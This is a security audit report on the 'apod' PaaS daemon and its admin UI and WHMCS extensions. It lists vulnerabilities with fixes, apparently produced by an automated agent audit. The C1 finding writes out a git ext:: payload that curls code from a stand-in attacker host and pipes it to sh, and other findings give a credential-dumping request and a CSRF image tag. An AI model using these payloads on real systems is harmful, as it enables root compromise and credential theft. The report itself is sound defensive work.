# apod / apod-ui — Security & Bug Audit Report

**Date:** 2026-06-18
**Scope:** `aystro-com/apod` (Go PaaS daemon + CLI + billing extensions) and `aystro-com/apod-ui` (React admin panel)
**Method:** Full-source review of authentication, session/token/2FA, command execution, Docker/git/proxy, storage/DB/webhooks, billing-panel PHP extensions, frontend, and CI/installer/driver supply chain.

> ⚠️ This file documents exploitable issues. Treat as sensitive. Fix high-severity items before the next release.

---

## Executive summary

The codebase is, in many respects, carefully written: passwords use bcrypt, tokens/sessions use 256-bit `crypto/rand` and are stored only as SHA-256 hashes, TOTP uses constant-time comparison, **all** SQL is parameterized (no SQL injection found anywhere), and the React UI has no `dangerouslySetInnerHTML`/`eval`/`innerHTML` sinks.

However, there is a **systemic input-validation gap** in the Go engine: the validators `isValidDomain`/`isValidPort` are enforced in only a handful of HTTP handlers, while the engine methods themselves trust their arguments. This produces the most serious findings — a single authenticated, non-admin user can reach **root RCE** via an unvalidated git repo URL, and there are multiple container-escape and path-traversal chains. A second cluster of issues surrounds the **web terminal** trust model (tokens bound to a domain, not a user) and the **billing-panel proxy** that decouples ownership checks from the token actually executed.

### Highest-priority fixes (do these first)
1. **C1 — git repo URL → root RCE.** Allowlist git URL schemes + `-c protocol.ext.allow=never` + `--`. (`engine/engine.go:219`, `deploy.go:57`)
2. **C2 — storage provider secrets readable by any authenticated user** and returned in plaintext. Admin-gate + redact + encrypt. (`server.go:107`, `db/storage.go:13`)
3. **C3 — domain validation bypass** on clone/import/add-domain → path traversal, Traefik rule hijack, shell injection in DB containers. Validate in the engine, not just handlers.
4. **C4 — web-terminal token is not bound to a user**; the WHMCS proxy forwards a client-supplied token without re-checking it belongs to the owned service → cross-tenant container shell.
5. **C5 — compose-file "sanitizer" is bypassable** → `privileged: true` / host-socket mounts in a malicious driver/compose → container escape.

---

## CRITICAL

### C1. Git repo URL → remote code execution as root
**`internal/engine/engine.go:219`** (also `internal/engine/deploy.go:53,57`)
```go
cmd := exec.CommandContext(ctx, "git", "clone", "--branch", branch, "--single-branch", opts.Repo, siteRoot)
```
`opts.Repo` comes straight from the `POST /sites` body and is **never validated** (only `Domain` is, in the handler). Git's `ext::` transport executes shell commands:
```
"repo": "ext::sh -c \"curl http://attacker/x|sh\""
```
The daemon runs as root (manages Docker/ufw/systemd), so any user who can create a site gets root RCE on the VPS in a single request. The deploy path re-clones with the same unvalidated `site.Repo`, and `branch` (from `DeployHandler`, unvalidated) is concatenated into git args.

**Fix:** Reject repo URLs whose scheme isn't `https://`/`git@host:`; reject values containing `::` or a leading `-`. Add to every git invocation: `-c protocol.ext.allow=never -c protocol.file.allow=user` and a `--` separator before positional args. Validate `branch` against `^[A-Za-z0-9._/-]+$`.

---

### C2. Storage provider secrets stored in plaintext and exposed to every authenticated user
**`internal/db/storage.go:13`**, **`internal/server/routes.go:527`**, **`internal/server/server.go:107-109`**

The `storage_configs.config` column holds raw JSON with S3/R2 `access_key`/`secret_key` and SFTP `password` (no encryption at rest). `ListStorageConfigsHandler` serializes the full struct (`Config string` has `json:"config"`) straight back to the client. Critically, the `/storage` routes are registered in the **normal authenticated group, above the `AdminOnly` group** (server.go:172), so **any** authenticated low-privilege user can:
```
GET /api/v1/storage  →  {"config":"{\"access_key\":\"AKIA...\",\"secret_key\":\"...\"}"}
```
and exfiltrate every tenant's cloud/SFTP credentials.

**Fix:** Move storage routes into the `AdminOnly` group; redact secret fields in list responses; encrypt the `config` blob at rest with a server key.

---

### C3. Domain/owner validation bypass → path traversal, Traefik rule injection, container/DB shell injection
**`internal/engine/clone.go:12`**, **`internal/engine/domain.go:17`**, **`internal/engine/migrate.go:131`**, **`internal/engine/user.go:253`**

`isValidDomain` runs only in `CreateSite`'s HTTP handler. `CloneSiteHandler` (`req.Target`), `AddDomain` (`req.Domain`), and `ImportSite` (`metadata.json` domain) pass values with **no format check** into:
- `SiteDir(owner, domain)` → `filepath.Join("/home", owner, "sites", domain, ...)` — a `domain`/`owner` of `../../etc` traverses; `os.Chown`/`os.MkdirAll`/`copyDir` then operate on arbitrary host paths (e.g. chown `/etc`).
- `composeProjectName(domain)` → `docker compose -p <project>` and systemd slice unit paths (`compose.go:109`).
- Traefik router rules `Host(`%s`)` (`traefik.go:211`) — a value with a backtick/`||` **hijacks routing for another tenant's domain**.
- DB name `strings.ReplaceAll(domain, ".", "_")` interpolated into `sh -c "mysql ..."` (`database.go:31`, `clone.go:76`) — shell injection inside the DB container once the domain contains metacharacters.

**Fix:** Validate `domain` (`isValidDomain`) and `owner` (`^[a-z_][a-z0-9_-]*$`) **inside** the engine entry points `CreateSite`, `Clone`, `AddDomain`, `ImportSite`, `Deploy` so both CLI and HTTP paths are covered. Add a containment check after every `filepath.Join`.

---

### C4. Web-terminal token is bound to a domain, not a user → cross-tenant container shell (esp. via WHMCS proxy)
**`internal/engine/terminal.go:13-84`**, **`internal/server/server.go:209`**, **`extensions/whmcs/modules/servers/apod/terminal_proxy.php:19-70`**

The `/api/v1/terminal/exec` endpoint is mounted **outside** the API-key auth group; the `term_` token is the sole authenticator. `ValidateTerminalToken` maps token→domain only — it is **not bound to the user/session that minted it**. The token itself is strong (32-byte `crypto/rand`, 5-min TTL, 100-cmd cap), so brute force is not the concern; **leakage/sharing/decoupling** is.

The WHMCS proxy makes this exploitable cross-tenant: it checks that `$userId` owns `$serviceId` (good) but then forwards the **client-supplied `token`** untouched without confirming the token's domain matches that service's domain. A customer who owns service A and possesses any token for victim domain `b.com` calls the proxy with their own `service_id` (passes ownership) + `token=<b.com token>` → command executes in **b.com's container**. The ownership check validates a different object than the one that routes the command.

**Fix:** Bind terminal tokens to the minting user/session and re-check site access on each `exec`. In the WHMCS proxy, never accept a client-supplied token — derive the domain from the owned service server-side, mint the token there, and forward only that. Move `/api/v1/terminal/exec` behind `AuthMiddleware` (the token can be an additional factor).

---

### C5. Compose-file "sanitizer" is bypassable → container escape via `privileged`/host-socket
**`internal/engine/compose.go:43-86`** (`sanitizeComposeFile`)

`sanitizeComposeFile` strips `ports:`/`container_name:` by line-prefix string matching. It does **not** strip `privileged: true`, `cap_add`, `devices`, `pid: host`, `network_mode: host`, or a bind mount of `/var/run/docker.sock`, and is trivially evaded by flow-style YAML/anchors/JSON-in-YAML. A malicious compose driver or repo can therefore request `privileged: true` or a host-socket mount and `docker compose up` will honor it → **escape to host root**.

**Fix:** Parse the compose YAML into a typed struct, explicitly reject `privileged`/`cap_add`/`devices`/`pid:host`/`network_mode:host`/`/var/run/docker.sock` and host-sensitive bind mounts, then re-serialize from the parsed model.

---

## HIGH

### H1. Unauthenticated webhook deploy trigger with no HMAC signature
**`internal/engine/webhook.go:13,24`**, **`internal/server/server.go:211`**
`POST /webhook/{token}` is unauthenticated by design (URL token is the only secret) and triggers a git pull + rebuild via `e.Deploy(...)`. There is **no HMAC payload signature** (no `X-Hub-Signature-256` check), so request bodies are trusted blindly, and anyone who learns a webhook URL (logs, referer, CI leak) can force deploys. Also `rand.Read`'s error is ignored at token generation (webhook.go:13).
**Fix:** Verify an HMAC over the body with `hmac.Equal` against a per-webhook secret; check the `rand.Read` error; rate-limit the endpoint.

### H2. SSRF / DNS-rebinding in the uptime monitor poller
**`internal/engine/uptime.go:98-117,156`**
`EnableUptime` validates the URL once, but `ping()` re-fetches the stored URL on every tick with **no `validatePublicURL` at request time**. An attacker registers a domain that resolves public at creation, then rebinds it to `169.254.169.254`/`127.0.0.1` → blind SSRF to cloud metadata/internal services from the host. `validatePublicURL` also **fails open** on DNS-lookup error (returns nil = allow) and doesn't block `0.0.0.0`/IPv6 loopback/ULA.
**Fix:** Re-validate inside `ping()` using a `Transport.DialContext` that checks the *resolved* IP at connect time (the only robust anti-rebinding fix); make `validatePublicURL` fail-closed and cover `0.0.0.0`/IPv6.

### H3. SFTP host-key verification disabled
**`internal/storage/sftp.go:56`** — `HostKeyCallback: ssh.InsecureIgnoreHostKey()`
Backup/restore SFTP connections accept any host key while using password auth, so an on-path attacker can impersonate the server, capture the SFTP password, and serve a poisoned restore archive.
**Fix:** Pin a host key (`ssh.FixedHostKey`/`knownhosts`); add a `host_key` config field.

### H4. SSH public key appended to **root**'s `authorized_keys` without parsing
**`internal/engine/proxy.go:54-75`**
`AddSSHKey` appends an unvalidated public key to `/root/.ssh/authorized_keys`. A value containing a newline can inject a second key line or `command=`/`from=` options → **persistent root SSH access**. (Currently a placeholder, but the design is dangerous.)
**Fix:** Parse with `ssh.ParseAuthorizedKey`, reject multi-line input, write one normalized line, and never use *root's* file for site-level users.

### H5. Self-update & driver-update download with no signature/checksum verification
**`internal/engine/update.go:53,107,151-167`**, **`install.sh:31-39`**, **`.goreleaser.yml`**
`SelfUpdate` overwrites the running root binary with a GitHub asset over plain `http.Get` with no integrity check; `UpdateDrivers` writes unverified YAML from `raw.githubusercontent.com` (driver YAMLs control what runs as root). GoReleaser emits **no `checksums.txt`** and the installer does no verification → MITM/release-compromise = root RCE on update/install.
**Fix:** Add `checksum:`+`signs:` (cosign) to GoReleaser; verify SHA-256/signature in `install.sh` and in `SelfUpdate`/`UpdateDrivers`; ship drivers inside the signed release tarball; pin downloads to `https`+trusted host.

### H6. Rate-limit bypass via spoofable `X-Forwarded-For` on login/2FA/setup
**`internal/server/ratelimit.go:89-92`**
The limiter keys on client-supplied `X-Forwarded-For` with no trusted-proxy allowlist, so rotating the header gives a fresh bucket per request — defeating the 10/min login limiter and exposing the password and 6-digit TOTP fields to brute force.
**Fix:** Only trust `X-Forwarded-For` when `r.RemoteAddr` is a configured trusted proxy; otherwise key on `RemoteAddr`. Take the right-most untrusted hop.

### H7. No account-scoped lockout on the second factor; weak recovery-code entropy
**`internal/engine/auth.go:86-125`**, **`internal/engine/totp.go:129-144`**
2FA verification has no per-account attempt counter (only the IP limiter, bypassable via H6). Recovery codes use only **5 bytes (40 bits)** of entropy (`generateRecoveryCodes`), brute-forceable as an online oracle once the IP throttle is gone.
**Fix:** Add account-scoped failed-attempt backoff/lock for the 2FA step; raise recovery-code entropy to ≥128 bits (16+ random bytes, base32).

### H8. WHMCS terminal proxy disables TLS verification (and uses `http://`)
**`extensions/whmcs/modules/servers/apod/terminal_proxy.php:56,64-65`**
```php
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
```
Terminal commands and tokens traverse a link with verification disabled (the main module verifies correctly — the proxy is inconsistent). On-path attackers read/modify shell commands and capture tokens.
**Fix:** Use HTTPS with `VERIFYPEER=true`, `VERIFYHOST=2`.

### H9. WHMCS restore/backup actions are CSRF-able state-changing GETs
**`extensions/whmcs/modules/servers/apod/apod.php:312-313,494`**
Restore is a plain GET link reading `$_GET['backup_id']` with no CSRF token (only a JS `confirm()`). An `<img src=...restoreBackupById&backup_id=1>` on an attacker page destroys a logged-in victim's site data.
**Fix:** Require POST + WHMCS CSRF token (`check_token`) for all state-changing actions.

### H10. Bearer token (incl. long-lived API key) stored in `localStorage`
**`apod-ui/src/lib/auth.tsx:36-58,156-162`**, **`src/lib/api.ts:271-278`**
The bearer credential — a 24h session token *or* a long-lived API key — is persisted in `localStorage`/`sessionStorage` and sent as `Authorization: Bearer`. Any XSS or malicious dependency reads `localStorage["apod.connection"]` and exfiltrates full PaaS control. The API-key path is worst (long-lived, often the CI/CLI key). The login page's "nothing long-lived is stored" copy is misleading for the API-key path.
**Fix:** Prefer an `HttpOnly; Secure; SameSite=Strict` session cookie + CSRF token (server change). At minimum keep the API-key path memory-only; reserve storage for short-lived session tokens.

---

## MEDIUM

### M1. IDOR — by-ID deletes lack ownership scoping
**`internal/server/routes.go:810`**, **`internal/db/cron.go:74`** (and proxy/schedule equivalents)
`RemoveCronJobHandler` takes a raw `id` from the body and calls `DeleteCronJob(id)` with no `checkSiteAccess` and no `WHERE site_domain = ?`. A user can delete another tenant's cron job/proxy rule/schedule by ID.
**Fix:** Scope deletes `WHERE id = ? AND site_domain = ?`; verify the resource's domain against the access-checked domain in the handler.

### M2. Traefik runs with a read-write host Docker socket + global TLS-verify-off
**`internal/engine/traefik.go:180-184,97`**
The Traefik container mounts `/var/run/docker.sock` read-write and runs with `--serversTransport.insecureSkipVerify=true`. Any code-exec in Traefik (or a service attached to that mount) = host root; backend TLS is globally unverified.
**Fix:** Mount the socket `:ro` behind a docker-socket-proxy with a minimal API surface; reconsider the global `insecureSkipVerify`.

### M3. Cron command/schedule injection & unbounded job registration
**`internal/engine/cron.go:49,57,66`**, **`routes.go:771-789`**
`req.Schedule`/`req.Command`/`req.Service` are unvalidated; `AddFunc`'s error is ignored (malformed schedules silently dropped); no quota on job count (DoS via thousands of jobs). Cron runs `sh -c` with **no `isCommandSafe` filter**, so it can run commands the terminal endpoint refuses — inconsistent control.
**Fix:** Validate the schedule with `cron.ParseStandard`; validate `service` against the driver's service list; cap jobs per site; apply a consistent command policy.

### M4. Parameter/driver values injected unescaped into `.env`, `.sh`, and Traefik TOML
**`internal/engine/driver.go:63-90`**, **`compose.go:233,242,254,304-321`**
`expandVariables` does naive `strings.ReplaceAll` of user-supplied `opts.Params` into `.env` contents, driver `Files[].Content` (`.sh` files made `0755`), and the Traefik TOML — no escaping. A param with a newline injects env vars; a param flowing into a `.sh` file is code injection.
**Fix:** Validate each param against the driver's declared parameter schema; reject newlines/shell metacharacters; quote when emitting.

### M5. Decompression-bomb / OOM on backup create & restore
**`internal/engine/backup.go:143,330,376`**
Backups are built entirely in a `bytes.Buffer` and restores download the whole archive into memory before `zip.NewReader`; `io.Copy` during extraction is unbounded → host OOM (affecting all tenants) from a large/malicious archive (e.g. after the SFTP MITM in H3).
**Fix:** Stream to/from a temp file; wrap copies in `io.LimitReader`; cap entry count and total size.

### M6. FTP passwords hashed with unsalted SHA-256
**`internal/db/ftp.go:17-24`**
Fast, rainbow-table-able, correlates identical passwords across accounts.
**Fix:** bcrypt/argon2id with a per-record salt.

### M7. `--tls` flag is a no-op; daemon serves over plaintext HTTP
**`internal/cli/server.go:54-64`**, **`internal/server/server.go:241-244`**
`ListenTCP` uses `http.ListenAndServe` (plaintext) and the wired `--tls` flag is never read. `--listen 0.0.0.0:8443 --tls` serves the admin API in cleartext while implying TLS — admin credentials/PATs traverse the wire unencrypted. (Auth *is* enforced on the TCP path — this is a confidentiality/UX-trap issue, not an auth-bypass.)
**Fix:** Implement `ListenAndServeTLS` when `--tls`+certs are set, or remove the flag and document a TLS-terminating proxy; bind examples to loopback.

### M8. WHMCS XSS — token concatenated unescaped into inline `<script>`; backup fields unescaped in HTML
**`extensions/whmcs/modules/servers/apod/apod.php:243,307-310`**
`var token = "' . $termToken . '";` injects an API value into a JS string literal without encoding; backup id/storage-name/created-at are echoed into table cells without `htmlspecialchars`.
**Fix:** `json_encode($termToken, JSON_HEX_TAG|JSON_HEX_APOS|JSON_HEX_QUOT|JSON_HEX_AMP)`; wrap all dynamic HTML output in `htmlspecialchars(..., ENT_QUOTES)`.

### M9. WHMCS uses one omnipotent admin key for all customer-triggered actions
**`extensions/whmcs/modules/servers/apod/apod.php:634-648`**
Every apod call uses the server-wide admin key, which passes all `checkSiteAccess` checks. Any flaw that lets a customer influence the resolved domain yields cross-tenant access, because apod cannot enforce tenancy on an admin key.
**Fix:** Issue per-customer scoped API keys so apod enforces ownership server-side.

### M10. Unauthenticated duplicate `apod_terminalProxy()` with no ownership check
**`extensions/whmcs/modules/servers/apod/apod.php:359-413`**
This in-module proxy verifies the service exists but never checks `userid`, then forwards the client token to `/terminal/exec`. If any routing reaches it, it's a full authorization bypass. Dead/confusing code.
**Fix:** Delete it, or add the ownership check + hardening.

### M11. apod-ui ships no security headers and no TLS/HSTS in the deployed image
**`apod-ui/deploy/nginx.conf`**, **`Dockerfile`**
nginx sets none of `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Content-Security-Policy` (header form), `Strict-Transport-Security`, and `server_tokens off;` is missing; `listen 80;` only. The production CSP exists only as a build-time `<meta>` tag and `connect-src 'self' https:` allows token exfiltration to any HTTPS host.
**Fix:** Add the headers in nginx; terminate/redirect to TLS + HSTS; ship a strict `connect-src 'self'` CSP for the default same-origin image.

### M12. Supabase driver provisions a host Docker-socket path
**`drivers/supabase.yaml:69-70`** — `DOCKER_SOCKET_LOCATION: "/var/run/docker.sock"`
The upstream Supabase compose (pulled from mutable `master`) bind-mounts this into sub-services; an RCE in any Supabase service = host root.
**Fix:** Don't provision a host socket path (or scope via socket-proxy); pin the Supabase checkout to a commit, not `master`.

### M13. whmcs driver downloads ionCube loader unverified, runs as root, `chmod -R 777`
**`drivers/whmcs.yaml:54-59`**
A native Zend extension is fetched over the network with no checksum and loaded into every PHP request as root; `chmod -R 777` on app dirs.
**Fix:** Pin + verify SHA-256; use `770`/`775` with correct ownership.

---

## LOW / hardening

- **L1 — Path traversal latent in storage drivers.** `Local`/`SFTP` `Upload/Download/Delete` do `filepath.Join(base, key)` with no containment check (`storage/local.go:21`, `sftp.go:81`). Keys are server-generated today (not reachable), but any future user-influenced key is immediately exploitable. Add a `HasPrefix(Clean(path), Clean(base)+sep)` guard. *(Restore via `Local.Download` already lacks the check that `GetBackupPath` applies.)*
- **L2 — `rand.Read` errors ignored** in `engine/jwt.go:49` (`randomBase64`) and `webhook.go:13`. A theoretical short read yields a low-entropy/zero secret silently. Check and propagate.
- **L3 — `isCommandSafe` is a bypassable denylist** (`routes.go:1344`): blocks only `` ` `` and `$(`, not `;`, `&&`, `||`, `|`, `>`, `${IFS}`, newlines, or `python -c`. It runs `sh -c` in the container regardless, so treat it as **non-security** and rely on container hardening (caps dropped, no-new-privs); do not advertise it as a boundary.
- **L4 — TOTP replay floor not seeded at enrollment** (`engine/totp.go:51-66`): the code used to enable 2FA can be replayed for the first login (≤90s window). Persist the step in `Enable2FA`.
- **L5 — No idle session timeout** (`engine/auth.go:17`): a stolen `apod_sess_` token is valid for a full 24h regardless of activity. (Password change / key reset *do* revoke all sessions — good.) Consider idle expiry + rotation on privilege change.
- **L6 — Non-admin SFTP forces `PasswordAuthentication yes`** (`engine/user.go:284`). Prefer key-only SFTP.
- **L7 — Unpinned GitHub Actions** (`apod-ui/.github/workflows/image.yml`, `apod/.github/workflows/release.yml`): all actions use mutable tags (`@v4`, etc.) and `goreleaser version: latest`. Pin to commit SHAs. *(Permissions are correctly least-privilege; no `pull_request_target`; no `${{ github.event.* }}` in `run:` — verified clean.)*
- **L8 — `chmod -R 777`** in several drivers (`paymenter.yaml`, `laravel.yaml`, `php.yaml`) and **unauthenticated MongoDB** in `unifi.yaml`. Use `770`/`775`; set Mongo auth; confirm per-site network isolation.
- **L9 — apod-ui Dockerfile has no non-root `USER`** (`Dockerfile`): nginx master runs as root. Consider `nginxinc/nginx-unprivileged`. *(No secrets in layers; `.dockerignore` is correct — verified.)*
- **L10 — Error/connection details reflected to customers** in the WHMCS proxy (`terminal_proxy.php:77`, `apod.php:412,679`) can leak internal hostnames/ports. Return generic errors; log details server-side.
- **L11 — `$DRIVER_FILES` unquoted** in the installer loop (`install.sh:54`) — minor word-splitting sloppiness.

---

## Verified correct (checked — no action needed)

- **No SQL injection anywhere.** All `internal/db/*` queries use `?` placeholders; `UpdateSiteConfig` uses a column allowlist switch. No `fmt.Sprintf` into SQL.
- **Password hashing:** bcrypt (`DefaultCost`), per-hash salt, 8-char minimum. Login has username-enumeration defense (identical error + dummy bcrypt to equalize timing).
- **Token/session/PAT/API-key/terminal-token entropy:** 256-bit `crypto/rand`, error-checked (except the two in L2); stored only as SHA-256 hashes; raw shown once.
- **TOTP:** 160-bit secret, `subtle.ConstantTimeCompare`, ±1-step window, monotonic replay floor after first login. Recovery codes stored as bcrypt, consumed on use (only weakness is entropy, H7).
- **Session lifecycle:** all sessions + tokens revoked on password change, key reset, and user delete.
- **PAT scope enforcement:** `AbilityMiddleware` correctly forbids PATs from token-minting / 2FA / user-management / password endpoints — no privilege escalation via scoped token.
- **Site IDOR defense at handler layer:** `checkSiteAccess` enforces `site.Owner == user.Name` for non-admins on site routes; `ListSites` scopes by owner.
- **No `InsecureSkipVerify`** anywhere; S3/R2 use the AWS SDK with TLS intact.
- **Frontend:** no `dangerouslySetInnerHTML`/`innerHTML`/`eval`/`document.write`; all server/user data (logs, env, terminal output, proxy config) rendered as escaped React text; the single `target="_blank"` has `rel="noopener noreferrer"`; Bearer-in-header scheme → not CSRF-vulnerable today; 401 centrally clears storage. No prototype-pollution merge util.
- **No driver uses** `privileged:true`/`cap_add`/`network_mode:host`/`pid:host` or a socket *bind mount* (supabase's env hint, M12, is the only socket exposure); host mounts are scoped to site/data dirs; `static.yaml`/`apod-ui.yaml` mount `:ro`.
- **CI:** least-privilege `GITHUB_TOKEN` scopes; no `pull_request_target`; no untrusted input interpolated into `run:` steps.
- **nginx proxy target** is a fixed unix-socket upstream (no user-controlled `proxy_pass` → no SSRF).
- **DB root passwords randomized** (`MYSQL_RANDOM_ROOT_PASSWORD`); installer uses `mktemp -d`.

---

## Suggested remediation order

| Priority | Items |
|---|---|
| **Now** | C1, C2, C3, C4, C5, H1, H4, H5 |
| **This week** | H2, H3, H6, H7, H8, H9, H10, M1, M2 |
| **Next** | M3–M13 |
| **Backlog/hardening** | All L-items |

*Generated by an automated multi-agent source audit. Each finding cites `file:line`; validate fixes with regression tests before release.*
